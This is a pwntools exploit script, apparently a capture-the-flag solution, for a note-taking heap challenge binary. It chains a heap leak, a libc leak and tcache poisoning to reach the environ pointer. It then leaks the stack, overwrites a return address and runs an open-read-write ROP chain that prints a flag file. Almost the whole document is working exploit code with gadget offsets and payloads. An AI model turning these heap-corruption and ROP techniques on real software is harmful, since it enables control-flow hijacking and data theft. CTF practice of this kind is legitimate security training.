#!/usr/bin/python3

from pwn import *

exe = ELF("./pin_note_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

rs   = lambda data: r.send(data)
rsa  = lambda msg, data: r.sendafter(msg, data)
rsl  = lambda data: r.sendline(data)
rsla = lambda msg, data: r.sendlineafter(msg, data)
rsn  = lambda num: r.send(str(num).encode())
rsna = lambda msg, num: r.sendafter(msg, str(num).encode())
rsln = lambda num: r.sendline(str(num).encode())
rslna = lambda msg, num: r.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x555555554000 + 0x0000000000003A0D
        b* 0x555555554000 + 0x000000000000312C
        b* 0x555555554000 + 0x0000000000003399
                
        c
        ''')
        # gdb.attach(r, gdbscript='''
        
        # b* 0x555555554000 + 0x0000000000003A0D
        # b* 0x555555554000 + 0x000000000000312C
        # c
        # ''')
        sleep(1)

# b* 0x555555557728
#         b* 0x55555555712c
#         b* 0x5555555574f0
def add_note(size):
    sla('$> ', b'add')
    slna('Enter size of note: ',size)

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
    r = process([exe.path])




def add_note(ch,size):
    if ch:
        sla("$> ", b'add')
        slna("Enter size of note: ", size)
    else:
        rsla("$> ", b'add')
        rslna("Enter size of note: ", size)
def edit_note(ch,idx,content):
    size = len(content)
    if ch:
        sla("$> ", b'edit')
        slna("Enter index of note to edit: ",idx)
        slna("Enter newsize: ", size)
        sla("Do you confirm to editing this note? (y/n):", b'y')
        sa("Enter new content for note: ",content)
    else:
        rsla("$> ", b'edit')
        rslna("Enter index of note to edit: ",idx)
        rslna("Enter newsize: ", size)
        rsla("Do you confirm to editing this note? (y/n):", b'y')
        rsa("Enter new content for note: ",content)
def del_note(ch,idx):
    if ch:
        sla("$> ", b'del')
        slna("Enter index of note to delete: ",idx)
    else:
        rsla("$> ", b'del')
        rslna("Enter index of note to delete: ",idx)
def show_note(ch,idx):
    if ch:
        sla("$> ", b'show')
        slna("Enter index of note to show: ",idx)
    else:
        rsla("$> ", b'show')
        rslna("Enter index of note to show: ",idx)


slna("select: ",1)
sla("9 characters):", b'MImi')


rslna("select: ",1)
rsla("9 characters):", b'MImi')


## Bypass rand to 2 process have same file name 
slna("select: ",2)
rslna("select: ",2)

### STAGE 1: LEAK HEAP
add_note(1,0x10)
add_note(1,0x20)

add_note(0,0x500)
sleep(1)
del_note(1,1)
edit_note(1,0,b'a'*0x20)
show_note(1,0)
p.recvuntil(b'a'*0x20)
heap_base = u64(p.recv(5)+b'\0\0\0')<<12
info("heap base: "+hex(heap_base))
payload = b'a'*0x18
payload += p64(0x31)
edit_note(1,0,payload)

### STAGE 2: LEAK LIBC
add_note(1,0x30) #idx1
add_note(1,0x500) 
add_note(1,0x30)

add_note(0,0x500) #idx1
del_note(1,2)

edit_note(1,1,b'a'*0x40)

show_note(1,1)
p.recvuntil(b'a'*0x40)
libc_leak = u64(p.recv(6)+b'\0\0')
info("libc_leak: "+hex(libc_leak))
libc.address = libc_leak - 0x21ace0
info("libc_base: "+ hex(libc.address))
environ_addr = libc.sym['environ']
info("environ: "+hex(environ_addr))

payload = b'a'*0x38
payload += p64(0x511)
edit_note(1,1,payload)


### STAGE 3: LEAK_STACK
add_note(1,0x500) #idx2
add_note(1,0x30)  #idx4

add_note(0,0x600) #idx2

del_note(1,4)
del_note(1,3)

payload = b'a'*0x500
payload += p64(0x510)
payload += p64(0x41)
payload += p64(environ_addr ^ (heap_base+0x8c0)>>12)

edit_note(1,2,payload)

add_note(1,0x30)  #idx3
add_note(1,0x30)  #idx4 (environ)

show_note(1,4)
p.recvuntil(b"Content: ")
stack_leak = u64(p.recv(6)+b'\0\0')
info("stack leak: "+hex(stack_leak))
rbp_addr = stack_leak - 0x1b8
info("rbp_addr: "+ hex(rbp_addr))


add_note(1,0x40)  #idx5
add_note(1,0x40)  #idx6 
add_note(1,0x40)  #idx7 

add_note(0,0x40) #idx3
add_note(0,0x40) #idx4
add_note(0,0x500) #idx5

del_note(1,7)
del_note(1,6)

payload = b'a'*0x40
payload += p64(0x40)
payload += p64(0x41)
payload += p64(rbp_addr ^ (heap_base+0x990)>>12)
edit_note(1,5,payload)

add_note(1,0x40)  #idx6
add_note(1,0x40)  #idx7 (ret)

add_note(0,0x50) #idx6
add_note(0,0x500) #idx7

POP_RAX = libc.address + 0x0000000000045eb0
POP_RDI = libc.address + 0x000000000002a3e5
POP_RSI = libc.address + 0x000000000002be51
POP_RCX = libc.address + 0x000000000003d1ee
POP_RDX_RBX = libc.address + 0x00000000000904a9
SYSCALL = libc.address + 0x91316
path_flag_addr = heap_base+0x990




#STAGE 4: overwrite RET with ORW func
path_flag = b"/mnt/d/flag"
edit_note(1,6,path_flag)

payload = flat(
    rbp_addr - 0x300,   
    POP_RAX, 2,         
    POP_RDI, path_flag_addr,
    POP_RSI, 0,         
    POP_RDX_RBX, 0, 0, 
    SYSCALL
)

payload += flat(
    
    POP_RAX, 0,         
    POP_RDI, 3,         
    POP_RSI, heap_base + 0x1000, 
    POP_RDX_RBX, 0x100, 0, 
    SYSCALL,


    POP_RAX, 1,        
    POP_RDI, 1,         
    POP_RSI, heap_base + 0x1000,
    POP_RDX_RBX, 0x100, 0,
    SYSCALL
)
edit_note(1,7,payload)
# GDB()
sla("$> ", b'exit')








# gdb.attach(p)
p.interactive()

# heap leak => libc leak =>(tcache poisioning) malloc to environ => leak stack => change ret_addr =>open read write